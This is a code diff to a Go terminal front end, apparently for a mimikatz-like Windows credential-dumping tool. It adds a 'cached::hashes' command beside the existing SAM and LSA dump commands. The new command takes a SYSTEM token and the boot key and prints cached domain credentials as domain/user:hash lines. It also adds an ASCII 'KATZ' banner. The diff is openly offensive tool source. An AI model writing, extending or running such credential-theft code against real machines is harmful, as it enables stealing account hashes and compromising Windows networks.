@@ -14,8 +14,19 @@ import (
 	"golang.org/x/sys/windows"
 )
 
+const banner = `
+  /\_/\  (    ██╗  ██╗ █████╗ ████████╗███████╗
+ ( ^.^ ) _)   ██║ ██╔╝██╔══██╗╚══██╔══╝╚══███╔╝
+   \"/"  (     █████╔╝ ███████║   ██║     ███╔╝ 
+ ( | | )      ██╔═██╗ ██╔══██║   ██║    ███╔╝  
+(__d b__)      ██║  ██╗██║  ██║   ██║   ███████╗
+               ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝`
+
+
 var (
-	commands = []string{"sam::dump", "sam::sysKey", "sam::bootKey", "token", "lsa::dump"}
+	commands = []string{"sam::dump", "sam::sysKey", 
+	"sam::bootKey", "token", 
+	"lsa::dump", "cached::hashes"}
 )
 
 type Model struct {
@@ -38,6 +49,7 @@ func InitialModel() Model {
 		textInput: ti,
 		wintoken:  0,
 		parsedArgs: make(map[string]string),
+		outputtext: banner + "\n",
 	}
 }
 
@@ -132,10 +144,9 @@ func (m Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 						var history = false
 						for arg, _ := range m.parsedArgs {
 							if arg == "nonVista" {
-								commandOutput += "attacking old ass system\n"
+								result += "attacking old ass system\n"
 								VistaStyle = false
-							}
-							if arg == "history" {
+							}else if arg == "history" {
 								history = true
 								commandOutput += "getting history\n"
 							}else {
@@ -150,6 +161,45 @@ func (m Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 							for index := range secrets{
 								commandOutput += secrets[index].PrintSecret() + "\n"
 							}
+						}
+					}
+					commandOutput += result + "\n"
+
+				}
+			case strings.HasPrefix(m.inputBuffer, "cached::hashes"):
+				if m.wintoken == 0 {
+					commandOutput += "Need system account token!\n"
+				}else {
+					var result string
+					var bootKey []byte
+					bootKey, err := modules.GetBootKey(m.wintoken)
+					if err != nil {
+						result = fmt.Sprintf("Error: %s", err)
+					} else {
+						var VistaStyle = true
+						for arg, _ := range m.parsedArgs {
+							if arg == "nonVista" {
+								result += "attacking old ass system\n"
+								VistaStyle = false
+							}else {
+								commandOutput += fmt.Sprintf("unknown arg '%s'\n",arg)
+							}
+
+						}
+						secrets, err := modules.CachedHashes(m.wintoken,bootKey, VistaStyle)
+						if err != nil {
+							result = "error: "+ err.Error()
+						}else {
+							if len(secrets) > 0 {
+							result += "Got Hashes!"
+							for index := range secrets{
+								d := secrets[index]
+								domain := d.Domain
+								nthash := d.Cache
+								user := d.User
+								result += fmt.Sprintf("%s/%s:%s\n",domain,user,nthash)
+							}
+						}
 						}
 					}
 					commandOutput += result + "\n"
@@ -198,7 +248,7 @@ func (m Model) Init() tea.Cmd {
 }
 
 func Run() {
-	p := tea.NewProgram(InitialModel())
+	p := tea.NewProgram(InitialModel(),tea.WithAltScreen())
 	if err := p.Start(); err != nil {
 		fmt.Printf("Error: %v", err)
 	}
